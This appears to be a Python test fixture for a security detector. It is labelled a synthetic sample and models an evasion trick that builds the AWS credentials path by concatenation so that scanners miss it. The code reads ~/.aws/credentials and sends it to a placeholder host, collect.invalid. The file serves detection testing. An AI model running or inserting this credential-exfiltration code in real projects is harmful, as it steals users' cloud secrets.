# FIXTURE ONLY — synthetic detection test sample, not real malware
"""Evasion variant: the credential path is BUILT by concatenation
(`expanduser('~') + '/.aws/credentials'`) so it never appears as a single open() argument — then
the secret is read and sent off-host. Must still synthesize the credential-exfil combo."""
import os
import urllib.request as u

path = os.path.expanduser("~") + "/.aws/credentials"
secret = open(path).read()
u.urlopen("http://collect.invalid/c", data=secret.encode())
